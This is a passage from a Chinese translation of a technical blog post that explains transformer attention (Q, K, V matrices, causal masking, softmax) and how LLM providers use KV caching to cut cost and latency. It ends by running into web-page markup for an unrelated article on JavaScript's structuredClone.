<p>任何在训练过程中被调整的数，都被称为“模型参数”。embedding 向量中的每个浮点数，以及 WQ、WK 矩阵中的每个数值，都是一个参数。当你听说某个模型有“1750 亿参数”时，指的就是这些数字。</p>
<p><strong>至于 WQ 和 WK 到底代表什么，我们其实并不完全清楚。随着模型训练收敛，它们最终会变成某种对 embedding 的变换方式，有助于模型生成更好的输出。</strong> 它们内部可能在做任何事情 —— 而如何解释这些矩阵的含义，目前仍是一个开放且活跃的研究方向。</p>
<p>要得到 Q 和 K，我们分别将 embeddings 与 WQ 和 WK 相乘。WQ 和 WK 的行数和列数始终等于 embedding 的维度（本例中为 3）。这里我为 WQ 和 WK 选取了随机值，并将结果四舍五入到小数点后两位以便阅读。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e159dbbf21a43e493f9ea943ea4b1c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=J8NZQfamfiu5kRPor3%2Bfi4SV9Eg%3D" alt="image.png" loading="lazy"/></p>
<p>得到的 Q 矩阵有 4 行 3 列。4 行是因为 embeddings 矩阵有 4 行（每个 token 一行），3 列是因为 WQ 有 3 列（每个 embedding 维度一列）。</p>
<p>K 的计算完全相同，只是将 WQ 换成 WK。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9175435a3134dd3ad535e8f2d17c353~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=%2B1QGrgQoo6JY1Fyc04q4Drb90r8%3D" alt="image.png" loading="lazy"/></p>
<p>Q 和 K 都是输入 embedding 到新的 n 维空间的"投影"。它们不是原始的 embedding，但由原始 embeddings 推导而来。</p>
<p>然后，我们将 Q 和 K 相乘。我们对 K 进行“转置”，也就是沿对角线翻转，使得得到的矩阵是一个方阵，其行数和列数都等于输入提示词中的 token 数量。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f16cbd2a6a194a50893b8a520f633862~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=psRQUMRukT1tbagekOepQNBsXmY%3D" alt="image.png" loading="lazy"/></p>
<p><strong>这些 scores 表示每个 token 对下一个生成 token 的重要程度。</strong> 左上角的数值 -0.08，代表 “Mary” 对 “had” 的重要性。再往下一行的 -0.10，则代表 “Mary” 对 “a” 的重要性。在展示完矩阵运算后，我会用图示更直观地说明这一点。接下来的所有操作，都是为了将这些 scores 转换为可用于混合 embeddings 的权重。</p>
<p>这个 score 矩阵的第一个问题是：它允许未来的 token 影响过去的 token。在第一行，我们唯一知道的词是"Mary"，所以它应该是唯一对生成"had"有贡献的词。第二行也是如此，我们知道"Mary"和"had"，所以只有这两个词应该对生成"a"有贡献，依此类推。</p>
<p>为了解决这个问题，我们对矩阵应用一个三角形掩码（triangular mask），将未来 token 对应的位置置零。不过，我们并不是真的设为 0，而是设为负无穷（negative infinity） —— 原因稍后解释。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1d01707f9c044bfad12682ae035fe81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=wkeNlMCQHEINeDc1SyHYhjM3C3Y%3D" alt="image.png" loading="lazy"/></p>
<p>第二个问题是，这些 scores 是任意的数值。如果它们能变成一个每行之和等于 1 的概率分布，对我们来说会更有用。这正是 softmax 函数的作用。softmax 具体如何运作的细节并不重要 —— 它比简单的“将每个数字除以该行总和”稍复杂一点，但结果是一样的：每行之和为 1，且每个数字都在 0 和 1 之间。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3277ecdbcf314dd6b331c68e31beaace~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=HB9xKE8kTusGY5oYNBPk92E%2BmoA%3D" alt="image.png" loading="lazy"/></p>
<p>为了解释为什么用负无穷，下面是一个 softmax 的代码实现：</p>
<pre><code class="hljs language-ini" lang="ini">function softmax(matrix){
return matrix.map(<span class="hljs-attr">row</span> =&gt;{
 const <span class="hljs-attr">exps</span> = row.map(x =&gt; Math.exp(x))<span class="hljs-comment">;</span>
 const <span class="hljs-attr">sumExps</span> = exps.reduce((a, b)=&gt; a + b,<span class="hljs-number">0</span>)<span class="hljs-comment">;</span>
return exps.map(<span class="hljs-attr">exp</span> =&gt; exp / sumExps)<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>
}
</code></pre>
<p>它并不是简单地把每个数加起来再除以总和，而是先对每个数值取 Math.exp，也就是计算 e^x。如果我们用 0 代替负无穷，Math.exp(0) === 1，这些被屏蔽的位置仍然会产生非零权重。而 Math.exp(-Infinity) 是 0，这正是我们想要的。</p>
<p>下面的图片展示了提示词"Mary had a little"的 attention 权重示例。</p>
<p>这些权重与上面的计算结果不匹配，因为我是从 Transformer Explained 网站[7]上运行的 GPT-2 模型中提取的。所以这些是一个真实模型（尽管是老模型）的真实权重。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97f4cdd50c414f2eb49315e76fba2187~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=x6%2Bbv%2FGgwA5sYI5WBpjEwVxJ2Rk%3D" alt="image.png" loading="lazy"/></p>
<p>第一行只有"Mary"，因此Mary对"had"的生成的贡献是100%。然后在第二行，"Mary"贡献了79%，而"had"贡献了21%用于生成"a"，以此类推。LLM 认为这个句子中最重要的词是 “Mary”，这一点并不意外——从每一行中 “Mary” 都拥有最高权重就能看出。如果我让你补全"Jessica had a little"这个句子，你不太可能选择"lamb"。</p>
<p>接下来就只剩下对 token embeddings 进行加权混合了，谢天谢地，这一步比计算权重要简单得多。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">// Learned during training, doesn<span class="hljs-comment">'t change </span>
// during inference. This <span class="hljs-built_in">is</span> also an n*n matrix,
// <span class="hljs-keyword">where</span> n <span class="hljs-built_in">is</span> the number <span class="hljs-keyword">of</span> embedding dimensions.
<span class="hljs-keyword">const</span> WV =[[...],[...],...];
 
<span class="hljs-keyword">function</span> attention(embeddings){
 <span class="hljs-keyword">const</span> V = embeddings * WV;
// This <span class="hljs-built_in">is</span> the `attentionWeights` <span class="hljs-keyword">function</span> <span class="hljs-keyword">from</span>
// the section above. We<span class="hljs-comment">'re wrapping it in</span>
// this `attention` <span class="hljs-keyword">function</span>.
 <span class="hljs-keyword">const</span> weights = attentionWeights(embeddings);
<span class="hljs-keyword">return</span> weights * V;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3be2d52478db48c3ad24342c21415e47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=2yUvvRSL5re74%2BV7fY2%2FMODfYwA%3D" alt="image.png" loading="lazy"/></p>
<p>为什么不直接混合原始 embeddings？</p>
<p>当我们通过 Q 和 K 相乘得到 attention 权重时，我们完全是在衡量 token 之间的相关性。Embeddings 编码了 token 的各种语义信息 —— 某一维可能表示“颜色”，另一维表示“大小”，再一维表示“礼貌/粗鲁程度”，等等。而权重是通过相似度来判断哪些 token 更相关。</p>
<p>WV 的作用，则是让模型决定在混合时保留哪些维度的信息。</p>
<p>以句子 “Mary had a little” 为例，这里关于 “Mary” 最重要的信息是“人名”。模型在训练中可能也学到了很多关于 “Bloody Mary（血腥玛丽鸡尾酒）” 或 “Mary Queen of Scots（苏格兰女王玛丽）” 的知识，但这些与这首童谣无关，如果带入后续计算反而会引入噪声。因此，WV 允许模型在混合 embeddings 之前，先过滤掉不相关的特征。</p>
<p>接着，我们将生成的权重与 V 相乘，输出一组新的 embeddings：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33fb977942b747efab4bd5d4a1c10f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=pS9CPjaJIGNm7kDP2Pb4drNJ%2F00%3D" alt="image.png" loading="lazy"/></p>
<p><strong>Attention 机制的最终输出，就是这个输出矩阵的最后一行。</strong> 通过 attention 过程，前面所有 token 的上下文信息都被融合进了这一行。但要注意：为了得到最后一行，前面所有行都必须被计算出来。</p>
<p>总而言之，输入是一组 embeddings，输出是一个新的 embedding。Attention 机制通过大量精细的数学运算，按照训练中学到的 WQ、WK 和 WV 矩阵所决定的重要性比例，将各个 token 的信息进行了加权融合。正是这一机制，让 LLM 能够理解在其上下文窗口中“什么内容重要，以及为什么重要”。</p>
<p>现在，我们终于掌握了讨论 caching 所需的一切知识。</p>
<p>当然，Attention 还有更多技术细节</p>
<p>我在本文展示的是一个简化版的 attention，目的是突出与 prompt caching 最相关的核心部分。实际中的 attention 机制更为复杂。如果你希望深入了解更多技术细节，我推荐 3blue1brown 关于 attention 的视频[8]。</p>
<h2 data-id="heading-4"><strong>05 Prompt caching</strong></h2>
<p>我们再来看一遍上面的网格，但这次会展示在推理循环中每生成一个新 token 时，它是如何逐步填充的。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd098773c4594486abaaf3d19da88503~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=6Xnizr8khWVeWGjfnV00BU1s758%3D" alt="image.png" loading="lazy"/></p>
<p>每次生成新 token 时，都会将其追加到输入中，并重新完整处理整个 prompt。但仔细观察：之前计算出的权重从未改变。第二行始终是 0.79 和 0.21，第三行始终是 0.81、0.13、0.06。我们其实在不断重复大量不必要的计算。如果你刚刚才处理完 “Mary had a”，那么在生成下一个 token 时，对 “Mary had a little” 中前三个 token 的大部分矩阵运算其实是冗余的 —— 而这正是 LLM 推理循环的默认行为。</p>
<p>通过以下两个改动，就能避免这些重复计算：</p>
<ul>
<li><strong>在每次迭代中缓存 K 和 V 矩阵。</strong></li>
<li><strong>只将最新 token 的 embeddings 输入模型，而不是整个 prompt。</strong></li>
</ul>
<p>现在我们再次走一遍矩阵运算过程，但这一次：前 4 个 token 的 K 和 V 矩阵已被缓存，我们只传入一个新 token 的 embeddings。</p>
<p>是的，又要面对矩阵运算了，抱歉！不过内容和之前基本一致，我们会快速过一遍。</p>
<p>计算新的 Q 时，输出只有一行。WQ 和之前一样，没有变化。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/534869cbd4814219923cc9154703a6ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=yD%2FZ1XvqmZFawz%2FnANDnmqKyrxQ%3D" alt="image.png" loading="lazy"/></p>
<p>接着，计算新的 K 也同样只输出一行，而 WK 也和之前一样保持不变。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4b2e3118920486495c4b0bd227b946e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=rnR12gAjn75v2iHrtxQpW2RYDPE%3D" alt="image.png" loading="lazy"/></p>
<p>但随后我们将这一新行追加到前一次迭代缓存的 4 行 K 矩阵之后：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95e7ec0e039e434fa75df74e6904d7cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=N%2B%2FjErKQgdBZNc809KbjSJDZ0wI%3D" alt="image.png" loading="lazy"/></p>
<p>于是现在我们拥有了提示词中所有 token 的 K 矩阵，但我们只需要计算它的最后一行。</p>
<p>我们继续以这种方式来获取新的 score：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cee05647e3c4fc8a4750770e2ea0fe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=ycfCSP99sq2Sx3IDun%2FeiB8DeUU%3D" alt="image.png" loading="lazy"/></p>
<p>以及新的的 weights：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6633a0b02c5441d39dfe5f0ecf6169f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=uuBcj%2FAsiYDVlAzGjPWUtDmNDt0%3D" alt="image.png" loading="lazy"/></p>
<p>全程我们只计算必需的部分，完全不需要对旧值进行任何重新计算。获取 V 的新一行时也是同样的做法：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/502a7fd0566f417c800bbfd161d43fb6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=1vh%2BWgC6qYbc5z9SwbJWRCWe13s%3D" alt="image.png" loading="lazy"/></p>
<p>然后将其追加到我们缓存的 V 中：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f94842f7ce014c74a28953735532c2cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=lMmh5Eso7c2PCvVC2igKDhSb4YY%3D" alt="image.png" loading="lazy"/></p>
<p>最后，我们将新的权重与新的 V 相乘，得到最终的新 embeddings：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adf75bd238f5464a848ba387b856bf5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=%2BwGCAkxH2%2B14Ww%2BgefkR1I4a%2FYk%3D" alt="image.png" loading="lazy"/></p>
<p>我们只需要这单独一行新的 embedding。得益于缓存的 K 和 V，先前所有 token 的上下文信息都已被融入其中。</p>
<p><strong>被缓存的数据是 embeddings * WK 和 embeddings * WV 的结果，也就是 K 和 V。</strong> 因此，提示词缓存通常被称为"KV caching"。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/411d6b1a3a20496bba649b733f64d87a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771565238&amp;x-signature=hSH8tERZlEuqQqKjlZpj4X8acnE%3D" alt="image.png" loading="lazy"/></p>
<p>就是这样，上面那些 K 和 V 矩阵，就是服务提供商保存在他们巨大数据中心里的 1 和 0，用来给我们提供一折的 token 成本和更快的响应。</p>
<p>服务提供商在请求发出后，会将每个提示词的这些矩阵保留 5-10 分钟，如果你发送一个以相同提示词开头的新请求，他们就会复用缓存的 K 和 V，而不是重新计算它们。<strong>缓存匹配不需要完全一致 —— 即使新 prompt 只和缓存中的某一部分开头相同，也可以复用那部分已缓存的计算结果，而不必整个 prompt 完全匹配。</strong></p>
<p>OpenAI 和 Anthropic 的缓存机制截然不同。<strong>OpenAI 完全自动处理，会尽可能尝试将请求路由到缓存条目。</strong> 在我的实验中，通过发送请求然后立即重发，缓存命中率约为 50%。考虑到长上下文窗口的首字节延迟（time-to-first-byte）可能很长，这种自动缓存可能导致性能表现不稳定。</p>
<p><strong>Anthropic 则赋予你更多控制权，让你决定何时缓存以及缓存多久。</strong> 你需要为这项特权付费，但在我进行的实验中，当我们要求 Anthropic 缓存某个提示词时，他们会 100% 地将请求路由到缓存条目。因此，如果你的应用涉及长上下文窗口，并且需要可预测的延迟，Anthropic 可能是更合适的选择。</p>
<p>等等，那 temperature 这些参数会影响提示词缓存吗？</p>
<p>LLM 提供商提供了多种参数来控制模型输出的随机性，常见的有 temperature、top_p 和 top_k。这些参数都作用于推理循环的最后一步，即模型根据它为词表中每个 token 分配的概率来选取 token。这发生在 attention 机制产生最终 embedding 之后，因此提示词缓存不受这些参数影响。你可以随意调整它们，而不用担心导致缓存的提示词失效。</p>
<h2 data-id="heading-5"><strong>致谢</strong></h2>
<p>为了学习撰写本文所需的全部知识，我如饥似渴地阅读了大量优质内容，以下是我认为对我最有帮助的：</p>
<ul>
<li>Build a Large Language Model (From Scratch)[9] by Sebastian Raschka[10].</li>
<li>Neural Networks: Zero to Hero[11] by Andrej Karpathy[12].</li>
<li>Neural Networks video course[13] by 3blue1brown[14].</li>
<li>Transformer Explainer[15] by Aeree Cho[16] et al.</li>
</ul>
<p>如果你喜欢这篇文章，你一定会喜欢这些资源。</p>
<p><strong>END</strong></p>
<p><strong>本期互动内容 🍻</strong></p>
<p><strong>❓按照文中逻辑，缓存本质是拿内存换计算。当你处理10万Token以上的超长上下文时，有没有估算过KV Cache的内存占用成本 vs 重新计算的API成本？在什么临界点你会选择放弃缓存？</strong></p>
<p><strong>文中链接</strong></p>
<p>[1]<a href="https://link.juejin.cn?target=https%3A%2F%2Fclaude.com%2Fblog%2Fprompt-caching" target="_blank" title="https://claude.com/blog/prompt-caching" ref="nofollow noopener noreferrer">claude.com/blog/prompt…</a></p>
<p>[2]<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.claude.com%2Fen%2Fdocs%2Fbuild-with-claude%2Fprompt-caching" target="_blank" title="https://docs.claude.com/en/docs/build-with-claude/prompt-caching" ref="nofollow noopener noreferrer">docs.claude.com/en/docs/bui…</a></p>
<p>[3]<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.openai.com%2Fdocs%2Fguides%2Fprompt-caching" target="_blank" title="https://platform.openai.com/docs/guides/prompt-caching" ref="nofollow noopener noreferrer">platform.openai.com/docs/guides…</a></p>
<p>[4]<a href="https://link.juejin.cn?target=https%3A%2F%2Fmagazine.sebastianraschka.com%2F" target="_blank" title="https://magazine.sebastianraschka.com/" ref="nofollow noopener noreferrer">magazine.sebastianraschka.com/</a></p>
<p>[5]<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frasbt%2FLLMs-from-scratch%2Fblob%2Fmain%2Fch05%2F13_olmo3%2Fstandalone-olmo3.ipynb" target="_blank" title="https://github.com/rasbt/LLMs-from-scratch/blob/main/ch05/13_olmo3/standalone-olmo3.ipynb" ref="nofollow noopener noreferrer">github.com/rasbt/LLMs-…</a></p>
<p>[6]<a href="https://link.juejin.cn?target=https%3A%2F%2Ftiktokenizer.vercel.app%2F" target="_blank" title="https://tiktokenizer.vercel.app/" ref="nofollow noopener noreferrer">tiktokenizer.vercel.app/</a></p>
<p>[7]<a href="https://link.juejin.cn?target=https%3A%2F%2Fpoloclub.github.io%2Ftransformer-explainer%2F" target="_blank" title="https://poloclub.github.io/transformer-explainer/" ref="nofollow noopener noreferrer">poloclub.github.io/transformer…</a></p>
<p>[8]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DeMlx5fFNoYc" target="_blank" title="https://www.youtube.com/watch?v=eMlx5fFNoYc" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=eMl…</a></p>
<p>[9]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oreilly.com%2Flibrary%2Fview%2Fbuild-a-large%2F9781633437166%2F" target="_blank" title="https://www.oreilly.com/library/view/build-a-large/9781633437166/" ref="nofollow noopener noreferrer">www.oreilly.com/library/vie…</a></p>
<p>[10]<a href="https://link.juejin.cn?target=https%3A%2F%2Fsebastianraschka.com%2F" target="_blank" title="https://sebastianraschka.com/" ref="nofollow noopener noreferrer">sebastianraschka.com/</a></p>
<p>[11]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DVMj-3S1tku0%26list%3DPLAqhIrjkxbuWI23v9cThsA9GvCAUhRvKZ" target="_blank" title="https://www.youtube.com/watch?v=VMj-3S1tku0&amp;list=PLAqhIrjkxbuWI23v9cThsA9GvCAUhRvKZ" ref="nofollow noopener noreferrer">www.youtube.com/watch?v=VMj…</a></p>
<p>[12]<a href="https://link.juejin.cn?target=https%3A%2F%2Fkarpathy.ai%2F" target="_blank" title="https://karpathy.ai/" ref="nofollow noopener noreferrer">karpathy.ai/</a></p>
<p>[13]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fplaylist%3Flist%3DPLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi" target="_blank" title="https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi" ref="nofollow noopener noreferrer">www.youtube.com/playlist?li…</a></p>
<p>[14]<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2F%403blue1brown" target="_blank" title="https://www.youtube.com/@3blue1brown" ref="nofollow noopener noreferrer">www.youtube.com/@3blue1brow…</a></p>
<p>[15]<a href="https://link.juejin.cn?target=https%3A%2F%2Fpoloclub.github.io%2Ftransformer-explainer%2F" target="_blank" title="https://poloclub.github.io/transformer-explainer/" ref="nofollow noopener noreferrer">poloclub.github.io/transformer…</a></p>
<p>[16]<a href="https://link.juejin.cn?target=https%3A%2F%2Faereeeee.github.io%2F" target="_blank" title="https://aereeeee.github.io/" ref="nofollow noopener noreferrer">aereeeee.github.io/</a></p>
<p><strong>本文经原作者授权，由</strong> <strong>Baihai IDP</strong> <strong>编译。如需转载译文，请联系获取授权。</strong></p>
<p><strong>原文链接：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fngrok.com%2Fblog%2Fprompt-caching%2F" target="_blank" title="https://ngrok.com/blog/prompt-caching/" ref="nofollow noopener noreferrer">ngrok.com/blog/prompt…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 JSON.parse(JSON.stringify()) — 原生深拷贝 structuredClone]]></title>    <link>https://juejin.cn/post/7605810996125286434</link>    <guid>https://juejin.cn/post/7605810996125286434</guid>    <pubDate>2026-02-13T03:40:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125286434" data-draft-id="7605542907119124532" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 JSON.parse(JSON.stringify()) — 原生深拷贝 structuredClone"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-13T03:40:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陈广亮"/> <meta itemprop="url" content="https://juejin.cn/user/3139860937575934"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 JSON.parse(JSON.stringify()) — 原生深拷贝 structuredClone
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860937575934/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陈广亮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:40:38.000Z" title="Fri Feb 13 2026 03:40:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol 